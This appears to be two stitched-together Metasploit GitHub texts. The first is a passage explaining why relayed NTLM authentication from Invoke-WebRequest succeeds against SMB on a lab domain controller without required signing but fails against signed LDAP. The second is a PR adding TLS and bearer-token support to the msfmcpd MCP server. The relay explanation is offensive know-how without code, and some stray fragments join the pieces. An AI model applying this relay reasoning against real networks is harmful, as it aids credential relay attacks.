**SMB negotiates packet signing separately from the NTLM `SIGN` flag.** That distinction makes Invoke-WebRequest work in this lab.
1. The relay forwards Invoke-WebRequest’s NTLM messages unchanged, preserving its signing flags and MIC. Authentication therefore succeeds.
2. Metasploit controls the outgoing SMB connection and does not request mandatory SMB signing.
3. DC2 has `RequireSecuritySignature=False`, so it accepts subsequent unsigned SMB requests. SMB enforces this through its own signing settings. [[Microsoft SMB specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/85df1680-2ee7-4d25-a916-a982371ddc75)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/85df1680-2ee7-4d25-a916-a982371ddc75).

**LDAP uses the negotiated NTLM security context directly for its SASL message protection.** Preserving Invoke-WebRequest’s signing negotiation establishes a security layer that subsequent LDAP messages must use. The relay cannot generate those signatures without the session key. [[Microsoft LDAP specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/284923c1-6a5b-4510-b97a-631963c0c3bd)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/284923c1-6a5b-4510-b97a-631963c0c3bd).

## Environment

| Field | Details |
|-------|---------|
| **Operating System** |  Windows 2019 Domain Controller, Windows 10 Victim host |

codex for debugging, testing done manually
54:Tac1,## Summary

Adds HTTPS/TLS support to `msfmcpd`, allowing the MCP server to run over the Streamable HTTP transport with self-signed or CA-issued certificates, Bearer token authentication, and configurable Puma threading/worker options.

## Changes

- TLS certificate generation/validation (`Msf::MCP::Config::TlsCertGenerator`)
- Config loading/validation updates for `mcp.ssl`, `mcp.ssl_cert`, `mcp.ssl_key`, `mcp.workers`, `mcp.min_threads`, `mcp.max_threads`
- Server wiring for HTTPS via Puma
- Fixed duplicated field name in the ssl_cert/ssl_key validation error message
- Applied Rubocop safe autocorrections across touched files (string literal style, indentation, block delimiters, etc.)

## Testing

Full spec suite: `1274 examples, 0 failures` (`bundle exec rspec spec/lib/msf/core/mcp spec/plugins/mcp_spec.rb`).

Manual end-to-end verification:
- Started `msfmcpd` with `transport: http`, `ssl: true`, `auth_token` set, against a live `msfrpcd` instance (auto-started via `auto_start_rpc`)
- Confirmed TLS handshake and self-signed cert generation/reuse
- Confirmed Bearer auth enforcement
- Completed full MCP handshake: `initialize` → `Mcp-Session-Id` header issued → `tools/list` returned the full tool catalog (module/session/host/service/vuln/note/credential/loot tools)
- Verified in both single-process (`workers: 0`) and cluster mode (`workers: 2`)

## Known limitation (not introduced by this PR, documented for visibility)

With `transport: http` and `workers > 0` (Puma cluster mode), MCP session continuity breaks across requests. The underlying `mcp` gem (v0.13.0)'s `StreamableHTTPTransport` stores session state in an in-process `Hash` with no shared backend, so a client's `Mcp-Session-Id` is only valid on the specific Puma worker that handled `initialize`. Any follow-up request routed to a different worker returns `404 Session not found`. Recommend documenting that `workers: 0` (single-process) is required for `transport: http` until the `mcp` gem supports pluggable/shared session storage.
